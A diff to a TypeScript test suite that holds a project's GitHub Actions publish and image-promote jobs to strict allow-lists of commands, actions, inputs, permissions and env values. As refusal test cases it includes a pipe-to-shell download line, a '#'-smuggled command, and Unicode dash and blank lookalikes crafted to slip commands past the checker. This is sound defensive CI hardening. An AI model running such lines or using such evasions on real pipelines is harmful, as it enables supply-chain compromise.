@@ -20,6 +20,11 @@ const workflowDir = path.join(__dirname, '..', '..', '.github', 'workflows');
 type Step = { name?: string; run?: string; uses?: string; with?: unknown; env?: unknown };
 type Workflow = { jobs?: Record<string, { steps?: Step[] }> };
 
+// The shell skips a space and a tab and nothing else. Each of these is a character that JavaScript treats as
+// white space (String.trim(), `\s`) and the shell reads as part of a word: `<U+a0>set` is a command of that
+// name (127), and one before a `#` leaves the `#` inside the word, so no comment starts there.
+const BLANK_LOOKALIKES = [0xa0, 0x0b, 0x0c, 0x3000, 0xfeff].map(code => String.fromCharCode(code));
+
 function workflowOf(file: string): Workflow {
   return yaml.load(fs.readFileSync(path.join(workflowDir, file), 'utf8')) as Workflow;
 }
@@ -69,6 +74,11 @@ describe('the non-root drop is enforced, not merely documented', () => {
     expect(executableLines('echo "${#list[@]}" $# ./scripts/smoke-test-non-root.sh')).toContain(
       'smoke-test-non-root.sh',
     );
+    // Only a space or a tab ends a word: after any other blank the '#' is part of the word, so the `;` that
+    // follows still ends the command and the script after it runs.
+    for (const blank of BLANK_LOOKALIKES) {
+      expect(executableLines(`echo x${blank}#; ./scripts/smoke-test-non-root.sh`)).toContain('smoke-test-non-root.sh');
+    }
   });
 
   // BOTH paths. The tag path is the one that promotes to `latest`, so a check present only on the PR
@@ -182,8 +192,9 @@ describe('a job that runs a repo script checks the repo out', () => {
  * install, test and build happen in a job without the grant.
  *
  * Those two families are checked in every workflow. Any other installer (npx, a local npm install, gem,
- * go) in the id-token job of another workflow is not caught here; the JavaScript SDK's publish job, the
- * one such job there is, is held to an allow-list of its commands, actions and keys further down.
+ * go) is caught by the allow-list further down, which holds each id-token job (the two SDK publish jobs and
+ * the image promote job) to the commands, actions, inputs and keys it names and refuses an id-token job it
+ * has no list for.
  */
 describe('a job that can mint a publish credential pins global npm installs and runs no Python installer', () => {
   type Permissions = Record<string, string> | string | null | undefined;
@@ -373,41 +384,204 @@ describe('a job that can mint a publish credential pins global npm installs and 
     expect(pythonInstallsInOidcJobs(file)).toEqual([]);
   });
 
-  // The JavaScript SDK's toolchain (the install, the test runner, the compiler that builds dist/) is
-  // third-party code as well. Its publish job uploads the tarball the build job made and tested, and
-  // runs nothing but the pinned npm that publishes it. An allow-list, not a list of what to avoid: the
-  // job's whole command set is three lines, and any other command (a local install, node, another
-  // package manager, a script of the repository) or action is new code running beside the credential.
-  const PUBLISH_COMMANDS = [
-    /^npm install -g npm@\d+\.\d+\.\d+$/,
-    /^npm --version$/,
-    /^npm publish "\$GITHUB_WORKSPACE"\/package\/\*\.tgz --access public --ignore-scripts$/,
-  ];
-  const PUBLISH_ACTIONS = /^actions\/(?:setup-node|download-artifact)@[0-9a-f]{40}$/;
-  // Beyond the lines it runs: a step key that injects code or changes what it runs under (env, shell,
-  // working-directory), an input the two actions do not need, and a job or workflow key that does the same
-  // for every step. Anything not named here has to be added on purpose.
-  const PUBLISH_STEP_KEYS = new Set(['name', 'uses', 'run', 'with']);
-  const PUBLISH_WITH_KEYS = new Set(['node-version', 'name', 'path']);
-  const PUBLISH_JOB_KEYS = new Set(['needs', 'runs-on', 'timeout-minutes', 'permissions', 'steps']);
+  // The toolchains (the install, the test runner, the compiler that builds dist/) are third-party code as
+  // well, so they run in jobs without the grant, and a job that has it runs a short, fixed set of lines. An
+  // allow-list, not a list of what to avoid: the SDK publish jobs upload the artifact their build job made
+  // and tested, and the image promote job re-points tags at a manifest that was already built and
+  // smoke-tested. Any other command (a local install, node, another package manager, a script of the
+  // repository), action, input or key is new code running beside the credential, so it has to be added
+  // here on purpose. A job that gains the grant without an entry is refused by name.
+  //
+  // A string is an exact match; a RegExp is anchored by its author and used only where a line varies.
+  type Allowed = string | RegExp;
+  type JobAllowList = {
+    // Whole lines of a `run`, once comments and surrounding space are gone.
+    commands: Allowed[];
+    // Each action by name (it must be pinned to a commit), with the inputs it may be given and the values
+    // each may take. An input that is not named is refused: `repository-url`, `registry`, `run-id`,
+    // `github-token`, `digest-mismatch` and `push-to-registry` all change where the bytes go or come from.
+    actions: Record<string, Record<string, Allowed[]>>;
+    // A step key that injects code or changes what it runs under (env, shell, working-directory, if), and
+    // a job key that does the same for every step. `env` is read name by name where it is allowed.
+    stepKeys: string[];
+    jobKeys: string[];
+    // The one level each scope is held at; a scope that is not listed is held at none. A level that differs
+    // is refused, a lesser one and a scope the job has dropped included, so a drop is seen here and not on
+    // the tag run.
+    permissions: Record<string, string>;
+    // Step `env`: each name with the one value it may take.
+    env: Record<string, string>;
+  };
+  // `workflowEnv` names what the workflow sets for every job; `defaults` is never allowed.
+  type FileAllowList = { workflowEnv: string[]; jobs: Record<string, JobAllowList> };
 
-  const outsideAllowList = (source: string | OidcWorkflow): string[] => {
+  // The three typographic dashes, named by code point: written out, a lookalike reads as a hyphen in a diff.
+  const DASH_GLYPHS = [0x2013, 0x2014, 0x2015].map(code => String.fromCharCode(code));
+  const EM_DASH = DASH_GLYPHS[1];
+
+  const SDK_PUBLISH_KEYS = {
+    stepKeys: ['name', 'uses', 'run', 'with'],
+    jobKeys: ['needs', 'runs-on', 'timeout-minutes', 'permissions', 'steps'],
+    permissions: { contents: 'read', 'id-token': 'write' },
+    env: {},
+  };
+  const JS_SDK_RELEASE: FileAllowList = {
+    workflowEnv: [],
+    jobs: {
+      publish: {
+        ...SDK_PUBLISH_KEYS,
+        commands: [
+          /^npm install -g npm@\d+\.\d+\.\d+$/,
+          'npm --version',
+          'npm publish "$GITHUB_WORKSPACE"/package/*.tgz --access public --ignore-scripts',
+        ],
+        actions: {
+          'actions/setup-node': { 'node-version': [/^\d+$/] },
+          'actions/download-artifact': { name: ['js-sdk-package'], path: ['package/'] },
+        },
+      },
+    },
+  };
+  // No `run` at all: the job downloads the distributions and the PyPA action uploads them.
+  const PYTHON_SDK_RELEASE: FileAllowList = {
+    workflowEnv: [],
+    jobs: {
+      publish: {
+        ...SDK_PUBLISH_KEYS,
+        commands: [],
+        actions: {
+          'actions/download-artifact': { name: ['python-sdk-dist'], path: ['sdk/python/dist/'] },
+          'pypa/gh-action-pypi-publish': { 'packages-dir': ['sdk/python/dist'] },
+        },
+      },
+    },
+  };
+  // NODE_VERSION and DOCKER_PLATFORMS are the workflow's own env; no step of promote reads either.
+  const IMAGE_RELEASE: FileAllowList = {
+    workflowEnv: ['NODE_VERSION', 'DOCKER_PLATFORMS'],
+    jobs: {
+      promote: {
+        stepKeys: ['name', 'uses', 'id', 'with', 'env', 'run'],
+        jobKeys: ['name', 'runs-on', 'timeout-minutes', 'permissions', 'needs', 'steps'],
+        permissions: { packages: 'write', 'id-token': 'write', attestations: 'write' },
+        env: {
+          REPO: '${{ github.repository }}',
+          REF_NAME: '${{ github.ref_name }}',
+          TAGS: '${{ needs.docker.outputs.tags }}',
+          EXPECTED_DIGEST: '${{ needs.docker.outputs.digest }}',
+        },
+        actions: {
+          'docker/setup-buildx-action': {},
+          // The first login names the registry (ghcr.io) and the second takes the Docker Hub default.
+          'docker/login-action': {
+            registry: ['ghcr.io'],
+            username: ['${{ github.actor }}', '${{ secrets.DOCKERHUB_USERNAME }}'],
+            password: ['${{ secrets.GITHUB_TOKEN }}', '${{ secrets.DOCKERHUB_TOKEN }}'],
+          },
+          'actions/attest': {
+            'subject-name': ['${{ steps.image.outputs.name }}'],
+            'subject-digest': ['${{ needs.docker.outputs.digest }}'],
+          },
+        },
+        // The echoed messages carry an em dash; a line is compared as written, so it is named here too.
+        commands: [
+          'echo "name=ghcr.io/${REPO,,}" >> "$GITHUB_OUTPUT"',
+          'set -euo pipefail',
+          'staging="ghcr.io/${REPO,,}:smoke-${{ github.run_id }}"',
+          'actual="$(docker buildx imagetools inspect "$staging" --format \'{{.Manifest.Digest}}\')"',
+          'if [ "$actual" != "$EXPECTED_DIGEST" ]; then',
+          `echo "::error::staging digest $actual != build digest $EXPECTED_DIGEST ${EM_DASH} refusing to promote untested content"`,
+          'exit 1',
+          'fi',
+          'promoted=0',
+          'while IFS= read -r tag; do',
+          '[ -n "$tag" ] || continue',
+          'if [[ "$REF_NAME" == *-* ]] && [[ "$tag" =~ :[0-9]+\\.[0-9]+$ ]]; then',
+          `echo "skipping $tag ${EM_DASH} minor tags are not promoted from a prerelease"`,
+          'continue',
+          'echo "promoting -> $tag"',
+          'docker buildx imagetools create --tag "$tag" "$staging"',
+          'promoted_digest="$(docker buildx imagetools inspect "$tag" --format \'{{.Manifest.Digest}}\')"',
+          'if [ "$promoted_digest" != "$EXPECTED_DIGEST" ]; then',
+          'echo "::error::$tag resolved to $promoted_digest after promotion, expected $EXPECTED_DIGEST"',
+          'promoted=$((promoted + 1))',
+          'done <<< "$TAGS"',
+          'if [ "$promoted" -eq 0 ]; then',
+          `echo "::error::no release tags were produced by metadata-action ${EM_DASH} nothing was promoted"`,
+          'echo "promoted $promoted tag(s), all digest-identical to the tested build"',
+          'ref="ghcr.io/${REPO,,}:${GITHUB_REF#refs/tags/v}"',
+          'docker buildx imagetools inspect "$ref" | tee /tmp/inspect.txt',
+          'for want in linux/amd64 linux/arm64; do',
+          'grep -q "$want" /tmp/inspect.txt || { echo "MISSING PLATFORM: $want"; exit 1; }',
+          'done',
+        ],
+      },
+    },
+  };
+  const ALLOW_LISTS: Record<string, FileAllowList> = {
+    'js-sdk-release.yml': JS_SDK_RELEASE,
+    'python-sdk-release.yml': PYTHON_SDK_RELEASE,
+    'release.yml': IMAGE_RELEASE,
+  };
+
+  const allows = (list: Allowed[], value: string): boolean =>
+    list.some(item => (typeof item === 'string' ? item === value : item.test(value)));
+
+  const outsideAllowList = (source: string | OidcWorkflow, allowed: FileAllowList = JS_SDK_RELEASE): string[] => {
     const jobs = oidcJobs(source);
     if (jobs.length === 0) return [];
     const workflow = loadOidcWorkflow(source);
-    const found = ['env', 'defaults'].filter(key => workflow[key] !== undefined).map(key => `workflow: ${key}`);
+    const found: string[] = [];
+    for (const name of Object.keys(workflow.env ?? {})) {
+      if (!allowed.workflowEnv.includes(name)) found.push(`workflow: env ${name}`);
+    }
+    if (workflow.defaults !== undefined) found.push('workflow: defaults');
     for (const [job, def] of jobs) {
-      for (const key of Object.keys(def)) if (!PUBLISH_JOB_KEYS.has(key)) found.push(`${job}: job key ${key}`);
-      for (const step of def.steps ?? []) {
-        for (const key of Object.keys(step)) if (!PUBLISH_STEP_KEYS.has(key)) found.push(`${job}: step key ${key}`);
-        if (step.uses && !PUBLISH_ACTIONS.test(step.uses)) found.push(`${job}: uses ${step.uses}`);
-        for (const key of Object.keys(step.with ?? {})) {
-          if (!PUBLISH_WITH_KEYS.has(key)) found.push(`${job}: with ${key}`);
+      const list = Object.hasOwn(allowed.jobs, job) ? allowed.jobs[job] : undefined;
+      if (!list) {
+        found.push(`${job}: no allow-list`);
+        continue;
+      }
+      for (const key of Object.keys(def)) if (!list.jobKeys.includes(key)) found.push(`${job}: job key ${key}`);
+      // What the job holds is its own block, or the workflow's when it has none.
+      const held = def.permissions !== undefined ? def.permissions : workflow.permissions;
+      if (typeof held === 'string') {
+        found.push(`${job}: permissions ${held}`);
+      } else {
+        // A scope that is not named is held at none, so a listed scope the job left out is a drop.
+        const scopes = held ?? {};
+        for (const scope of new Set([...Object.keys(scopes), ...Object.keys(list.permissions)])) {
+          const level = Object.hasOwn(scopes, scope) ? scopes[scope] : 'none';
+          const listed = Object.hasOwn(list.permissions, scope) ? list.permissions[scope] : 'none';
+          if (level !== listed) found.push(`${job}: permission ${scope}: ${level}`);
         }
+      }
+      for (const step of def.steps ?? []) {
+        for (const key of Object.keys(step)) if (!list.stepKeys.includes(key)) found.push(`${job}: step key ${key}`);
+        if (list.stepKeys.includes('env')) {
+          for (const [name, value] of Object.entries((step.env ?? {}) as Record<string, unknown>)) {
+            if (!Object.hasOwn(list.env, name) || list.env[name] !== String(value)) {
+              found.push(`${job}: step env ${name}`);
+            }
+          }
+        }
+        if (step.uses !== undefined) {
+          const action = /^([^@\s]+)@[0-9a-f]{40}$/.exec(step.uses)?.[1];
+          const inputs = action !== undefined && Object.hasOwn(list.actions, action) ? list.actions[action] : undefined;
+          if (!inputs) {
+            found.push(`${job}: uses ${step.uses}`);
+          } else {
+            for (const [key, value] of Object.entries((step.with ?? {}) as Record<string, unknown>)) {
+              if (!Object.hasOwn(inputs, key)) found.push(`${job}: with ${key}`);
+              else if (!allows(inputs[key], String(value))) found.push(`${job}: with ${key}: ${String(value)}`);
+            }
+          }
+        }
+        // Only a space and a tab come off: trim() would also drop characters the shell reads as a word.
         for (const line of executableLines(step.run ?? '')
           .split('\n')
-          .map(text => text.trim())) {
-          if (line && !PUBLISH_COMMANDS.some(allowed => allowed.test(line))) found.push(`${job}: ${line}`);
+          .map(text => text.replace(/^[ \t]+|[ \t]+$/g, ''))) {
+          if (line && !allows(list.commands, line)) found.push(`${job}: ${line}`);
         }
       }
     }
@@ -421,9 +595,36 @@ describe('a job that can mint a publish credential pins global npm installs and 
     expect(globalInstallsInOidcJobs('js-sdk-release.yml')).toEqual([{ job: 'publish', spec: 'npm@12.1.0' }]);
   });
 
+  // Every workflow is read against its own list, so an id-token job anywhere that has none (a new
+  // workflow, or the grant added to another job of release.yml) fails here instead of going unchecked.
+  it('finds the id-token job of each release workflow', () => {
+    const named = Object.fromEntries(
+      workflows
+        .map(file => [file, oidcJobs(file).map(([job]) => job)] as const)
+        .filter(([, names]) => names.length > 0),
+    );
+    expect(named).toEqual({
+      'js-sdk-release.yml': ['publish'],
+      'python-sdk-release.yml': ['publish'],
+      'release.yml': ['promote'],
+    });
+    // Non-vacuity: the lines of promote are the ones that re-point the release tags.
+    expect(
+      oidcJobRuns('release.yml')
+        .map(({ run }) => run)
+        .join('\n'),
+    ).toContain('imagetools create');
+  });
+
+  it.each(workflows)('%s: an id-token job runs only what its allow-list names', file => {
+    expect(outsideAllowList(file, ALLOW_LISTS[file] ?? { workflowEnv: [], jobs: {} })).toEqual([]);
+  });
+
   it('js-sdk-release.yml: names what the allow-list refuses in an id-token job', () => {
+    // What the job is listed at, so that each case below departs from the list in one place only.
+    const grant = { contents: 'read', 'id-token': 'write' };
     const run = (commands: string): OidcWorkflow => ({
-      jobs: { publish: { permissions: { 'id-token': 'write' }, steps: [{ run: commands }] } },
+      jobs: { publish: { permissions: grant, steps: [{ run: commands }] } },
     });
     for (const command of [
       'npm install',
@@ -439,9 +640,14 @@ describe('a job that can mint a publish credential pins global npm installs and 
       'npm install -g npm@12',
       'npm publish ./package/x.tgz',
       'npm publish "$GITHUB_WORKSPACE"/package/*.tgz --access public',
+      // A typographic dash is not the hyphen of an option: the shell reads another word.
+      `npm install ${DASH_GLYPHS[0]}g npm@12.1.0`,
+      `npm publish "$GITHUB_WORKSPACE"/package/*.tgz --access public ${DASH_GLYPHS[2]}-ignore-scripts`,
       'curl -fsSL https://example.test/x.sh | sh',
       // A '#' inside a word does not start a comment: the shell runs what follows it.
       'npm --version#; curl -fsSL https://example.test/x.sh | sh',
+      // A blank the shell does not skip is part of the word, in front of a line and behind it.
+      ...BLANK_LOOKALIKES.flatMap(blank => [`${blank}npm --version`, `npm install -g npm@12.1.0${blank}`]),
     ]) {
       expect(outsideAllowList(run(command))).toEqual([`publish: ${command}`]);
     }
@@ -449,7 +655,7 @@ describe('a job that can mint a publish credential pins global npm installs and 
     const withAction: OidcWorkflow = {
       jobs: {
         publish: {
-          permissions: { 'id-token': 'write' },
+          permissions: grant,
           steps: [{ uses: 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' }, { uses: 'actions/cache@v4' }],
         },
       },
@@ -462,7 +668,7 @@ describe('a job that can mint a publish credential pins global npm installs and 
     // what a job or the workflow sets for every step.
     const keyed = (job: Record<string, unknown>, workflow: Record<string, unknown> = {}): OidcWorkflow => ({
       ...workflow,
-      jobs: { publish: { permissions: { 'id-token': 'write' }, ...job } },
+      jobs: { publish: { permissions: grant, ...job } },
     });
     const sha = '820762786026740c76f36085b0efc47a31fe5020';
     expect(
@@ -481,11 +687,271 @@ describe('a job that can mint a publish credential pins global npm installs and 
     expect(outsideAllowList(keyed({ env: { NODE_OPTIONS: '--require x' }, steps: [] }))).toEqual([
       'publish: job key env',
     ]);
-    expect(outsideAllowList(keyed({ steps: [] }, { env: { NODE_OPTIONS: '--require x' } }))).toEqual(['workflow: env']);
+    expect(outsideAllowList(keyed({ steps: [] }, { env: { NODE_OPTIONS: '--require x' } }))).toEqual([
+      'workflow: env NODE_OPTIONS',
+    ]);
+    // What the job holds is bounded as well: a second scope, write-all, a grant it only inherits, and a
+    // scope it has let go of.
+    expect(outsideAllowList(keyed({ permissions: { 'id-token': 'write', contents: 'write' }, steps: [] }))).toEqual([
+      'publish: permission contents: write',
+    ]);
+    expect(outsideAllowList(keyed({ permissions: { 'id-token': 'write' }, steps: [] }))).toEqual([
+      'publish: permission contents: none',
+    ]);
+    expect(outsideAllowList(keyed({ permissions: 'write-all', steps: [] }))).toEqual([
+      'publish: permissions write-all',
+    ]);
+    // A scope the list does not name and the job holds at none grants nothing.
+    expect(outsideAllowList(keyed({ permissions: { ...grant, packages: 'none' }, steps: [] }))).toEqual([]);
+    expect(
+      outsideAllowList({
+        permissions: { ...grant, packages: 'write' },
+        jobs: { publish: { steps: [] } },
+      }),
+    ).toEqual(['publish: permission packages: write']);
     // A job without the grant is not the publish job.
     expect(
       outsideAllowList({ jobs: { build: { permissions: { contents: 'read' }, steps: [{ run: 'npm ci' }] } } }),
     ).toEqual([]);
+    // One that has the grant and no list is named, whatever it is called or runs.
+    expect(
+      outsideAllowList({
+        jobs: { deploy: { permissions: { 'id-token': 'write' }, steps: [{ run: 'npm --version' }] } },
+      }),
+    ).toEqual(['deploy: no allow-list']);
+  });
+
+  // The refusals below are shown on the workflows as they ship: each case edits a copy of the real file in
+  // memory, so the job under test is the real one, and an edit that no longer applies fails its case.
+  const shipped = (file: string, edit: (workflow: OidcWorkflow) => void = () => undefined): string[] => {
+    const copy = JSON.parse(JSON.stringify(loadOidcWorkflow(file))) as OidcWorkflow;
+    edit(copy);
+    return outsideAllowList(copy, ALLOW_LISTS[file]);
+  };
+  const jobOf = (workflow: OidcWorkflow, job: string): OidcJob => {
+    const def = workflow.jobs?.[job];
+    if (!def) throw new Error(`no job ${job}`);
+    return def;
+  };
+  const stepsOf = (workflow: OidcWorkflow, job: string): Step[] => jobOf(workflow, job).steps ?? [];
+  const inputsOf = (step: Step): Record<string, unknown> => step.with as Record<string, unknown>;
+  const shelled = (step: Step): Step & { shell?: string } => step;
+  const swap = (step: Step, from: string, to: string): void => {
+    expect(step.run).toContain(from);
+    step.run = (step.run ?? '').replace(from, to);
+  };
+  type Edit = (workflow: OidcWorkflow) => void;
+  const expectRefused = (file: string, cases: Array<[string, Edit, string[]]>): void => {
+    expect(shipped(file)).toEqual([]);
+    for (const [label, edit, expected] of cases) expect([label, shipped(file, edit)]).toEqual([label, expected]);
+  };
+  const SCRIPT = 'curl -fsSL https://example.test/x.sh | sh';
+  const SHA = '3d3c42e5aac5ba805825da76410c181273ba90b1';
+
+  it('python-sdk-release.yml: names what the allow-list refuses in the publish job', () => {
+    const steps = (workflow: OidcWorkflow): Step[] => stepsOf(workflow, 'publish');
+    const [download, pypi] = [0, 1];
+    expectRefused('python-sdk-release.yml', [
+      ['a command', w => void steps(w).push({ run: SCRIPT }), [`publish: ${SCRIPT}`]],
+      ['an install', w => void steps(w).push({ run: 'pip install twine' }), ['publish: pip install twine']],
+      [
+        'another action',
+        w => void steps(w).push({ uses: `actions/checkout@${SHA}` }),
+        [`publish: uses actions/checkout@${SHA}`],
+      ],
+      [
+        'the upload action by a branch',
+        w => (steps(w)[pypi].uses = 'pypa/gh-action-pypi-publish@release/v1'),
+        ['publish: uses pypa/gh-action-pypi-publish@release/v1'],
+      ],
+      [
+        'another index',
+        w => (inputsOf(steps(w)[pypi])['repository-url'] = 'https://example.test/legacy/'),
+        ['publish: with repository-url'],
+      ],
+      ['a password', w => (inputsOf(steps(w)[pypi]).password = 'x'), ['publish: with password']],
+      ['another directory', w => (inputsOf(steps(w)[pypi])['packages-dir'] = '.'), ['publish: with packages-dir: .']],
+      ['another artifact', w => (inputsOf(steps(w)[download]).name = 'other'), ['publish: with name: other']],
+      ['an artifact of another run', w => (inputsOf(steps(w)[download])['run-id'] = '1'), ['publish: with run-id']],
+      [
+        'a download that tolerates a changed digest',
+        w => (inputsOf(steps(w)[download])['digest-mismatch'] = 'ignore'),
+        ['publish: with digest-mismatch'],
+      ],
+      ['a step env', w => (steps(w)[pypi].env = { PYTHONPATH: '.' }), ['publish: step key env']],
+      ['a shell', w => (shelled(steps(w)[pypi]).shell = 'python {0}'), ['publish: step key shell']],
+      ['a job env', w => (jobOf(w, 'publish').env = { PYTHONPATH: '.' }), ['publish: job key env']],
+      ['a container', w => (jobOf(w, 'publish').container = 'example.test/runner:1'), ['publish: job key container']],
+      [
+        'a wider grant',
+        w => (jobOf(w, 'publish').permissions = { contents: 'write', 'id-token': 'write' }),
+        ['publish: permission contents: write'],
+      ],
+      [
+        'a scope it no longer holds',
+        w => (jobOf(w, 'publish').permissions = { 'id-token': 'write' }),
+        ['publish: permission contents: none'],
+      ],
+      ['a workflow env', w => (w.env = { PYTHONPATH: '.' }), ['workflow: env PYTHONPATH']],
+      ['workflow defaults', w => (w.defaults = { run: { shell: 'python {0}' } }), ['workflow: defaults']],
+    ]);
+  });
+
+  it('release.yml: names what the allow-list refuses in the promote job', () => {
+    const steps = (workflow: OidcWorkflow): Step[] => stepsOf(workflow, 'promote');
+    const named = (workflow: OidcWorkflow, name: string): Step => {
+      const found = steps(workflow).find(step => step.name === name);
+      if (!found) throw new Error(`no step ${name}`);
+      return found;
+    };
+    const tag = (workflow: OidcWorkflow): Step => named(workflow, 'Tag the smoke-tested image with the release tags');
+    const uses = (workflow: OidcWorkflow, action: string, nth = 0): Step =>
+      steps(workflow).filter(step => (step.uses ?? '').startsWith(`${action}@`))[nth];
+    const lookalikeHyphens: Array<[string, string]> = [
+      ['set -euo pipefail', 'set -euo pipefail'],
+      ['read -r tag', 'while IFS= read -r tag; do'],
+      ['[ -n "$tag" ]', '[ -n "$tag" ] || continue'],
+      ['[ "$promoted" -eq 0 ]', 'if [ "$promoted" -eq 0 ]; then'],
+    ];
+    // The hyphen of an option or an operator in the decision lines, replaced by each lookalike. With an en
+    // dash for the first hyphen, `set -euo pipefail` only assigns positional parameters: errexit, nounset
+    // and pipefail stay off. A changed `read`, `[ -n` or `-eq` is another command the same way.
+    const lookalikes = lookalikeHyphens.flatMap(([fragment, line]) =>
+      DASH_GLYPHS.map((glyph): [string, Edit, string[]] => {
+        const changed = fragment.replace('-', () => glyph);
+        return [
+          `${line} with U+${glyph.charCodeAt(0).toString(16)}`,
+          w => swap(tag(w), fragment, changed),
+          [`promote: ${line.replace(fragment, () => changed)}`],
+        ];
+      }),
+    );
+    // A character that String.trim() drops and the shell does not skip, in front of a decision line or behind
+    // it, is not the listed line: the shell reads `<U+a0>set` as a command of that name.
+    const strayBlanks = ['set -euo pipefail', '[ -n "$tag" ] || continue', 'if [ "$promoted" -eq 0 ]; then'].flatMap(
+      line =>
+        BLANK_LOOKALIKES.flatMap((blank): Array<[string, Edit, string[]]> => {
+          const code = `U+${blank.charCodeAt(0).toString(16)}`;
+          return [
+            [`${code} before ${line}`, w => swap(tag(w), line, `${blank}${line}`), [`promote: ${blank}${line}`]],
+            [`${code} after ${line}`, w => swap(tag(w), line, `${line}${blank}`), [`promote: ${line}${blank}`]],
+          ];
+        }),
+    );
+    expectRefused('release.yml', [
+      ...lookalikes,
+      ...strayBlanks,
+      ['a step', w => void steps(w).push({ run: SCRIPT }), [`promote: ${SCRIPT}`]],
+      [
+        'a line in the tag step',
+        w => swap(tag(w), 'echo "promoted $promoted tag(s)', `${SCRIPT}\necho "promoted $promoted tag(s)`),
+        [`promote: ${SCRIPT}`],
+      ],
+      [
+        'a changed command',
+        w => swap(tag(w), 'imagetools create --tag', 'imagetools create --annotation k=v --tag'),
+        ['promote: docker buildx imagetools create --annotation k=v --tag "$tag" "$staging"'],
+      ],
+      [
+        'a weakened comparison',
+        w => swap(tag(w), 'if [ "$actual" != "$EXPECTED_DIGEST" ]; then', 'if [ -z "$actual" ]; then'),
+        ['promote: if [ -z "$actual" ]; then'],
+      ],
+      [
+        'another action',
+        w => void steps(w).push({ uses: `actions/cache@${SHA}` }),
+        [`promote: uses actions/cache@${SHA}`],
+      ],
+      [
+        'the attest action under another name',
+        w => (uses(w, 'actions/attest').uses = `actions/attest-build-provenance@${SHA}`),
+        [`promote: uses actions/attest-build-provenance@${SHA}`],
+      ],
+      [
+        'a login action by tag',
+        w => (uses(w, 'docker/login-action').uses = 'docker/login-action@v4'),
+        ['promote: uses docker/login-action@v4'],
+      ],
+      [
+        'a login against another registry',
+        w => (inputsOf(uses(w, 'docker/login-action')).registry = 'registry.example.test'),
+        ['promote: with registry: registry.example.test'],
+      ],
+      [
+        'a login with another secret',
+        w => (inputsOf(uses(w, 'docker/login-action', 1)).password = '${{ secrets.NPM_TOKEN }}'),
+        ['promote: with password: ${{ secrets.NPM_TOKEN }}'],
+      ],
+      [
+        'a builder driver',
+        w => (uses(w, 'docker/setup-buildx-action').with = { 'driver-opts': 'image=example.test/buildkit:1' }),
+        ['promote: with driver-opts'],
+      ],
+      [
+        'an attestation pushed to the registry',
+        w => (inputsOf(uses(w, 'actions/attest'))['push-to-registry'] = true),
+        ['promote: with push-to-registry'],
+      ],
+      [
+        'another subject digest',
+        w => (inputsOf(uses(w, 'actions/attest'))['subject-digest'] = 'sha256:0'),
+        ['promote: with subject-digest: sha256:0'],
+      ],
+      [
+        'a step env',
+        w => (tag(w).env = { ...(tag(w).env as object), DOCKER_HOST: 'tcp://x:1' }),
+        ['promote: step env DOCKER_HOST'],
+      ],
+      [
+        'a changed env value',
+        w => (tag(w).env = { ...(tag(w).env as object), TAGS: 'example.test/x:1' }),
+        ['promote: step env TAGS'],
+      ],
+      ['a shell', w => (shelled(tag(w)).shell = 'python {0}'), ['promote: step key shell']],
+      ['a job env', w => (jobOf(w, 'promote').env = { DOCKER_HOST: 'tcp://x:1' }), ['promote: job key env']],
+      [
+        'a service container',
+        w => (jobOf(w, 'promote').services = { x: { image: 'example.test/x:1' } }),
+        ['promote: job key services'],
+      ],
+      [
+        'a wider grant',
+        w =>
+          (jobOf(w, 'promote').permissions = {
+            packages: 'write',
+            'id-token': 'write',
+            attestations: 'write',
+            contents: 'write',
+          }),
+        ['promote: permission contents: write'],
+      ],
+      [
+        'a lesser level than the one it is listed at',
+        w => (jobOf(w, 'promote').permissions = { packages: 'read', 'id-token': 'write', attestations: 'write' }),
+        ['promote: permission packages: read'],
+      ],
+      [
+        'a scope it no longer holds',
+        w => (jobOf(w, 'promote').permissions = { 'id-token': 'write', attestations: 'write' }),
+        ['promote: permission packages: none'],
+      ],
+      [
+        'a scope it holds at none',
+        w => (jobOf(w, 'promote').permissions = { packages: 'write', 'id-token': 'write', attestations: 'none' }),
+        ['promote: permission attestations: none'],
+      ],
+      [
+        'a workflow env',
+        w => (w.env = { ...(w.env as object), NODE_OPTIONS: '--require x' }),
+        ['workflow: env NODE_OPTIONS'],
+      ],
+      ['workflow defaults', w => (w.defaults = { run: { shell: 'python {0}' } }), ['workflow: defaults']],
+      [
+        'the grant on another job',
+        w => (jobOf(w, 'docker').permissions = { packages: 'write', 'id-token': 'write' }),
+        ['docker: no allow-list'],
+      ],
+    ]);
   });
 
   // npm reads `dir/file.tgz` as the GitHub shorthand user/repo (hosted-git-info is tried before the file
@@ -574,6 +1040,80 @@ describe('a job that can mint a publish credential pins global npm installs and 
         jobs: { publish: { steps: [{ uses: 'actions/cache@v4' }] } },
       }),
     ).toEqual(['publish: actions/cache@v4 restores a cache']);
+  });
+});
+
+/**
+ * A publish job checks nothing out: what it publishes is whatever its build job uploaded under the
+ * artifact name it downloads, found where it downloads it. Neither job can see the other's text at run
+ * time, so the pair has to agree here, before the first tag.
+ *
+ * upload-artifact stores a single glob under the directory that holds it, so the tarball carries no
+ * directory part; download-artifact by name extracts into the given path itself. `if-no-files-found:
+ * error` stops a build that packed nothing, and the pinned npm refuses both a glob that matched nothing
+ * (ENOENT) and a second tarball (a usage error for two arguments), so the publish takes exactly one
+ * file or fails.
+ */
+describe('a publish job takes the artifact its build job uploads', () => {
+  type FlowStep = Omit<Step, 'with'> & { with?: Record<string, string>; 'working-directory'?: string };
+  type FlowJob = {
+    needs?: string | string[];
+    defaults?: { run?: { 'working-directory'?: string } };
+    steps?: FlowStep[];
+  };
+  const jobsOf = (file: string): Record<string, FlowJob> =>
+    (workflowOf(file) as unknown as { jobs: Record<string, FlowJob> }).jobs;
+  const only = (job: FlowJob, action: string): FlowStep => {
+    const found = (job.steps ?? []).filter(step => (step.uses ?? '').startsWith(`${action}@`));
+    expect(found).toHaveLength(1);
+    return found[0];
+  };
+  const indexOfUses = (job: FlowJob, action: string): number =>
+    (job.steps ?? []).findIndex(step => (step.uses ?? '').startsWith(`${action}@`));
+  const dirOf = (target: string | undefined): string => (target ?? '').replace(/\/+$/, '');
+  const runsOf = (job: FlowJob): string => (job.steps ?? []).map(step => executableLines(step.run ?? '')).join('\n');
+
+  it('js-sdk-release.yml: the tarball npm pack writes is the one the publish step names', () => {
+    const { build, publish } = jobsOf('js-sdk-release.yml');
+    const upload = only(build, 'actions/upload-artifact');
+    const download = only(publish, 'actions/download-artifact');
+    // `npm pack` writes into the working directory of its step, and the upload names that directory's
+    // tarballs: one pattern, one level, so one search path and no directory in the stored name.
+    const pack = (build.steps ?? []).findIndex(step => /^npm pack$/m.test(executableLines(step.run ?? '')));
+    expect(pack).toBeGreaterThan(-1);
